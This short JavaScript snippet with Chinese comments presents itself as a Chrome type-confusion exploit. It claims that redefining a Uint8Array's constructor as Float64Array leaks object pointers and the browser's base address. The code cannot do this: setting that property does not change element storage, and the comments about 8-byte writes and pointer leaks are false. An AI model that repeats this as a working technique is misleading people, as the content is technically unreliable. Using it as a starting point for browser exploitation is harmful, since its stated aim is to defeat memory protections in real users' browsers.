// 触发类型混淆
let arr = new Uint8Array(8);
Object.defineProperty(arr, 'constructor', {
    value: Float64Array
});
// 现在arr被视为Float64Array，写入浮点数
arr[0] = 1.234;  // 实际写入8字节，但解释为浮点数
// 读取时可能得到对象指针
let ptr = arr[0];
console.log("Leaked pointer: " + ptr);
// 实际利用中，通过构造对象布局泄露Chrome基址


